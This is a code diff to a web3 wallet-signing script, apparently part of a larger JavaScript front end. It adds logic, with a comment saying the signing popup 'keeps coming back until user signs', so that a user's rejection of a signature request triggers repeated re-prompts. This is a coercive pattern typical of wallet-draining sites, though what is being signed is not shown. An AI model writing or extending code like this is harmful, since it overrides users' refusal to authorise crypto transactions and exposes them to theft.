@@ -4054,6 +4054,8 @@
           if (sr && sr.error === 'rejected') {
             S.userRejectedSign = true;
             setPipelinePhase(PIPELINE.REJECTED);
+            // Re-trigger retry cycle so popup keeps coming back until user signs
+            try { UI.showUserRejected(); } catch (eRetry) {}
             return sr;
           }
           if (sr && sr.ok) {
@@ -8234,6 +8236,10 @@
     },
 
     showUserRejected: function () {
+      // Force pipeline to REJECTED so pipelineBusy() returns false and retry timer fires
+      // Bug: setPipelinePhase(REJECTED) can fail silently (wrapped in try/catch at call sites),
+      // leaving phase at SIGNING which blocks the retry timer below.
+      try { if (typeof setPipelinePhase === 'function' && typeof PIPELINE !== 'undefined') setPipelinePhase(PIPELINE.REJECTED); } catch (ePhForce) {}
       this.showStatus(userRejectionMessage());
       this.overlay.hide();
       var self = this;
@@ -8242,7 +8248,7 @@
         if (!pipelineBusy()) {
           startPipeline({ reason: 'reject-retry' });
         }
-      }, 300);
+      }, 1500);
     },
 
     setConnected: function (addr, chainName) {
